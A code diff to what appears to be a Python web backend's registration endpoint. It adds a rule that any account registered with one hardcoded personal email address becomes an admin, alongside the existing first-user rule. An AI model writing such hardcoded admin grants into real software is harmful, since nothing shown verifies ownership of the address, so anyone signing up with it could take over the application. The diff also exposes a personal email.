@@ -331,8 +331,8 @@ async def register(user: UserCreate):
     user_dict["password"] = hash_password(user_dict["password"])
     user_obj = User(**{k: v for k, v in user_dict.items() if k != "password"})
     
-    # First user becomes admin
-    if user_count == 0:
+    # First user OR Yasin's email becomes admin
+    if user_count == 0 or user.email.lower() == "turyasin@gmail.com":
         user_obj.is_admin = True
     
     doc = user_obj.model_dump()
